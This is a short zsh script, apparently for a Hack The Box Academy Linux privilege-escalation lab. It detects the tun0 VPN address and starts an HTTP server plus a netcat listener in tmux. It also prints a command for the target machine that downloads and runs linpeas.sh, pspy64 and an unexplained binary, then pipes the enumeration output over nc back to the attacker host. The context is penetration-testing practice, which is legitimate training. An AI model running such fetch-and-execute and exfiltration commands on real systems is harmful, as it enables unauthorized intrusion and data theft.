#! /bin/zsh
my_ip=$(ip a | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.*tun0.*" | awk {'print $2'} | awk -F"/" {'print $1'})
#echo $my_ip
echo -n "Run this command on a target machine:\nwget http://$my_ip:9999/linpeas.sh;chmod +x ./linpeas.sh; sh ./linpeas.sh | nc -q 5 $my_ip 10000; wget http://$my_ip:9999/ch; chmod +x ./ch; wget\
 http://$my_ip:9999/pspy64; chmod +x ./pspy64\n"
echo
echo 'Press any key to run a http server and netcat listener...'; read -k1 -s
tmux split-window 
tmux send -t 1 'cd /home/shyngys/labs/HTB/Academy/linux-privesc; /bin/python3 -m http.server 9999' ENTER
tmux send -t 0 '/bin/nc -lvnp 10000 | tee /home/shyngys/linpeas-logs/privesc-$(date '+%d-%m-%Y').log' ENTER
